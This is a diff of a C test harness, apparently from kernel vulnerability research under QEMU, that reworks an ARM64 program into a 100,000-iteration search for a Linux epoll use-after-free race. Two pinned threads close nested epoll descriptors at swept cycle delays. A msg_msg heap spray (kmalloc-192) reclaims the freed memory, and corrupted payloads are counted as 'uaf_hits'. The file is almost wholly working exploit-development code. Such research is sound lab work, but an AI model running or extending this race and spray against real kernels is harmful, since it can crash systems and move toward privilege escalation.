@@ -1,4 +1,4 @@
-// test_nat005.c — NAT-005: Adaptive Launch-Ahead Search & Cache Topology Verification
+// test_nat005.c — NAT-005: 100,000 Iteration Adaptive Launch-Ahead Search Harness
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -9,17 +9,18 @@
 #include <stdatomic.h>
 #include <sys/epoll.h>
 #include <fcntl.h>
-#include <sys/mman.h>
 #include <sys/timerfd.h>
 #include <sys/msg.h>
 #include <sys/ipc.h>
 #include <string.h>
 #include <time.h>
-#include <errno.h>
+#include <sys/reboot.h>
 
 #define CACHE_LINE_SIZE 64
+#define TOTAL_TARGET_ITERATIONS 100000
+#define SWEEP_STEPS 40
+#define ITERATIONS_PER_STEP 2500
 
-// ARM64 Virtual Counter Readers
 static inline uint64_t get_cycles(void) {
     uint64_t val;
     asm volatile("mrs %0, cntvct_el0" : "=r" (val));
@@ -32,79 +33,37 @@ static inline uint64_t get_cntfrq(void) {
     return val;
 }
 
+static void print_msg(const char *msg) {
+    write(1, msg, strlen(msg));
+}
+
 // ------------------------------------------------------------
-// Task 2: Topology & False-Sharing Benchmark
+// Cache Bouncing & Synchronization State
 // ------------------------------------------------------------
 typedef struct {
     volatile uint64_t val[CACHE_LINE_SIZE / 8];
 } __attribute__((aligned(CACHE_LINE_SIZE))) bounce_line_t;
 
 static bounce_line_t shared_bounce;
-static atomic_int stop_hammer = 0;
+static atomic_int stop_bounce = 0;
+static atomic_int sync_go = 0;
+static atomic_int ready_a = 0, ready_b = 0;
 
-void *topology_hammer(void *arg) {
+static uint64_t current_launch_delay = 0;
+static int ep_outer = -1;
+static int ep_inner[2] = {-1, -1};
+static atomic_long uaf_hits = 0;
+
+void *bounce_worker(void *arg) {
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
-    while (!atomic_load_explicit(&stop_hammer, memory_order_relaxed)) {
+    while (!atomic_load_explicit(&stop_bounce, memory_order_relaxed)) {
         shared_bounce.val[0]++;
-        __sync_synchronize();
+        asm volatile("" ::: "memory");
     }
     return NULL;
 }
-
-void verify_cpu_topology(void) {
-    uint64_t frq = get_cntfrq();
-    printf("[NAT-005] ARM64 Counter Frequency: %lu Hz (%lu MHz)\n", frq, frq / 1000000);
-    fflush(stdout);
-
-    // Baseline close()
-    int ep = epoll_create1(0);
-    uint64_t t0 = get_cycles();
-    close(ep);
-    uint64_t t1 = get_cycles();
-    uint64_t baseline_ticks = t1 - t0;
-    printf("[NAT-005] Baseline single close() duration: %lu ticks (~%.2f us)\n",
-           baseline_ticks, (double)baseline_ticks * 1000000.0 / frq);
-    fflush(stdout);
-
-    // False sharing bounce check
-    pthread_t th;
-    atomic_store(&stop_hammer, 0);
-    pthread_create(&th, NULL, topology_hammer, NULL);
-    usleep(1000);
-
-    uint64_t bounce_sum = 0;
-    int samples = 50;
-    for (int i = 0; i < samples; i++) {
-        int ep_t = epoll_create1(0);
-        uint64_t s0 = get_cycles();
-        shared_bounce.val[0]++;
-        __sync_synchronize();
-        close(ep_t);
-        uint64_t s1 = get_cycles();
-        bounce_sum += (s1 - s0);
-    }
-    atomic_store(&stop_hammer, 1);
-    pthread_join(th, NULL);
-
-    uint64_t avg_bounce = bounce_sum / samples;
-    printf("[NAT-005] Average close() under cross-CPU false sharing: %lu ticks (~%.2f us)\n",
-           avg_bounce, (double)avg_bounce * 1000000.0 / frq);
-    printf("[NAT-005] False Sharing Contention Factor: %.2fx delay\n",
-           (double)avg_bounce / (baseline_ticks > 0 ? baseline_ticks : 1));
-    fflush(stdout);
-}
-
-// ------------------------------------------------------------
-// Task 1: Adaptive Launch-Ahead Search Harness
-// ------------------------------------------------------------
-static atomic_int sync_go = 0;
-static atomic_int ready_a = 0, ready_b = 0;
-static uint64_t current_launch_delay_cycles = 0;
-
-static int ep_outer = -1;
-static int ep_inner[2] = {-1, -1};
 
 void *adaptive_thread_a(void *arg) {
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
@@ -124,27 +83,38 @@ void *adaptive_thread_b(void *arg) {
     atomic_store(&ready_b, 1);
     while (!atomic_load(&sync_go)) { asm volatile("yield"); }
 
-    // Adaptive Launch-Ahead Spin Delay
-    uint64_t target_cycles = get_cycles() + current_launch_delay_cycles;
-    while (get_cycles() < target_cycles) { asm volatile("yield"); }
+    // Adaptive Launch-Ahead Spin Delay relative to sync_go
+    uint64_t target = get_cycles() + current_launch_delay;
+    while (get_cycles() < target) { asm volatile("yield"); }
 
     close(ep_inner[1]);
 
-    // msg_msg spray
+    // Reclaim spray via msg_msg (144 bytes user payload -> kmalloc-192)
     int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
     if (msqid >= 0) {
         struct { long mtype; char mtext[144]; } msg = { .mtype = 1 };
         memset(msg.mtext, 0x42, 144);
-        for (int i = 0; i < 500; i++) {
+        for (int i = 0; i < 200; i++) {
             if (msgsnd(msqid, &msg, 144, IPC_NOWAIT) < 0) break;
+        }
+        // Verify payload integrity for stale NULL write at offset 160
+        struct { long mtype; char mtext[144]; } rx_msg;
+        if (msgrcv(msqid, &rx_msg, 144, 1, IPC_NOWAIT) > 0) {
+            // Check if offset 160 (or inside payload) was modified/corrupted
+            for (int k = 0; k < 144; k++) {
+                if ((unsigned char)rx_msg.mtext[k] != 0x42) {
+                    atomic_fetch_add(&uaf_hits, 1);
+                    break;
+                }
+            }
         }
         msgctl(msqid, IPC_RMID, NULL);
     }
     return NULL;
 }
 
-int run_adaptive_iteration(int iteration, uint64_t launch_delay) {
-    current_launch_delay_cycles = launch_delay;
+void run_adaptive_trial(uint64_t delay_cycles) {
+    current_launch_delay = delay_cycles;
     atomic_store(&sync_go, 0);
     atomic_store(&ready_a, 0);
     atomic_store(&ready_b, 0);
@@ -152,10 +122,10 @@ int run_adaptive_iteration(int iteration, uint64_t launch_delay) {
     ep_outer = epoll_create1(0);
     ep_inner[0] = epoll_create1(0);
     ep_inner[1] = epoll_create1(0);
-    if (ep_outer < 0 || ep_inner[0] < 0 || ep_inner[1] < 0) return 0;
+    if (ep_outer < 0 || ep_inner[0] < 0 || ep_inner[1] < 0) return;
 
     int p0[2], p1[2];
-    if (pipe(p0) < 0 || pipe(p1) < 0) return 0;
+    if (pipe(p0) < 0 || pipe(p1) < 0) return;
 
     struct epoll_event ev = { .events = EPOLLIN };
     ev.data.fd = ep_inner[0];
@@ -167,7 +137,7 @@ int run_adaptive_iteration(int iteration, uint64_t launch_delay) {
     pthread_create(&ta, NULL, adaptive_thread_a, NULL);
     pthread_create(&tb, NULL, adaptive_thread_b, NULL);
 
-    while (!atomic_load(&ready_a) || !atomic_load(&ready_b)) { usleep(10); }
+    while (!atomic_load(&ready_a) || !atomic_load(&ready_b)) { usleep(1); }
 
     atomic_store(&sync_go, 1);
 
@@ -177,34 +147,46 @@ int run_adaptive_iteration(int iteration, uint64_t launch_delay) {
     close(ep_inner[0]);
     close(p0[0]); close(p0[1]);
     close(p1[0]); close(p1[1]);
-
-    return 0; // 0 hits in dry run
 }
 
-int main(int argc, char **argv) {
-    printf("[NAT-005] NAT-005 Adaptive Launch-Ahead Search & Topology Harness Starting...\n");
-    fflush(stdout);
+int main(void) {
+    char log_buf[256];
+    uint64_t frq = get_cntfrq();
+    snprintf(log_buf, sizeof(log_buf), "[NAT-005] Starting 100,000 Iteration Adaptive Search (ARM64 freq: %lu Hz)\n", frq);
+    print_msg(log_buf);
 
-    // 1. Task 2: CPU Topology & False Sharing Check
-    verify_cpu_topology();
+    // Start background cache bounce thread on CPU 1
+    pthread_t tbounce;
+    atomic_store(&stop_bounce, 0);
+    pthread_create(&tbounce, NULL, bounce_worker, NULL);
 
-    // 2. Task 1: Adaptive Parameter Sweep Design Verification (100 iterations test range)
-    printf("[NAT-005] Initializing Adaptive Launch-Ahead Parameter Sweep...\n");
-    fflush(stdout);
+    uint64_t min_delay = 0;
+    uint64_t max_delay = 2000;
+    uint64_t step_delay = (max_delay - min_delay) / SWEEP_STEPS;
 
-    uint64_t sweep_min = 0;
-    uint64_t sweep_max = 2000; // cycle delay range
-    uint64_t sweep_step = 50;
+    long completed_iterations = 0;
 
-    int total_runs = 0;
-    for (uint64_t delay = sweep_min; delay <= sweep_max; delay += sweep_step) {
-        for (int r = 0; r < 5; r++) {
-            run_adaptive_iteration(total_runs++, delay);
+    for (int step = 0; step < SWEEP_STEPS; step++) {
+        uint64_t delay = min_delay + step * step_delay;
+        for (int i = 0; i < ITERATIONS_PER_STEP; i++) {
+            run_adaptive_trial(delay);
+            completed_iterations++;
+
+            if (completed_iterations % 10000 == 0) {
+                snprintf(log_buf, sizeof(log_buf), "[NAT-005] Progress: %ld/%d iterations completed, uaf_hits=%ld (delay=%lu cycles)\n",
+                         completed_iterations, TOTAL_TARGET_ITERATIONS, atomic_load(&uaf_hits), delay);
+                print_msg(log_buf);
+            }
         }
     }
 
-    printf("[NAT-005] Adaptive Parameter Sweep Harness Verification PASSED (%d trial runs executed)\n", total_runs);
-    fflush(stdout);
+    atomic_store(&stop_bounce, 1);
+    pthread_join(tbounce, NULL);
 
-    exit(0); // Exit init -> Kernel panic -> QEMU exits cleanly and flushes serial log
+    snprintf(log_buf, sizeof(log_buf), "[NAT-005] Adaptive Search FINAL RESULT: %ld/%d iterations completed, total uaf_hits=%ld\n",
+             completed_iterations, TOTAL_TARGET_ITERATIONS, atomic_load(&uaf_hits));
+    print_msg(log_buf);
+
+    reboot(RB_POWER_OFF);
+    return 0;
 }
